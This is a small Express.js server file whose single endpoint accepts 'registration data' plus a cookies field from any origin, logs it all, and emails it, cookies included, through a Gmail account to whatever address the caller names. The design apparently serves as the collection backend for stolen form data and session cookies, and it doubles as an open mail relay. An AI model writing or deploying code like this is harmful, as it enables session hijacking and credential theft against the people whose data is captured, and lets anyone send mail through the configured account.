
import express from 'express';
import cors from 'cors';
import nodemailer from 'nodemailer';
import dotenv from 'dotenv';

dotenv.config({ path: '../.env' });

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// POST /api/send-email - send registration info to email
app.post('/api/send-email', async (req, res) => {
  try {
    const { to, subject, text, html, cookies } = req.body;
    // Log all received data for debugging/auditing
    console.log('Received registration data:', req.body);
    if (cookies) {
      console.log('Cookies:', cookies);
    }
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
    });
    await transporter.verify();
    // Add cookies to the email body if present
    let htmlWithCookies = html;
    if (cookies) {
      htmlWithCookies += `<h3>Cookies</h3><div style="background:#f5f5f5;padding:10px;border-radius:4px;">${Array.isArray(cookies) ? cookies.map(c => `<p>${c}</p>`).join('') : cookies}</div>`;
    }
    const mailOptions = {
      from: process.env.EMAIL_USER,
      to,
      subject,
      text,
      html: htmlWithCookies,
    };
    await transporter.sendMail(mailOptions);
    res.json({ success: true, message: 'Email sent successfully.' });
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ success: false, message: 'Failed to send email.' });
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});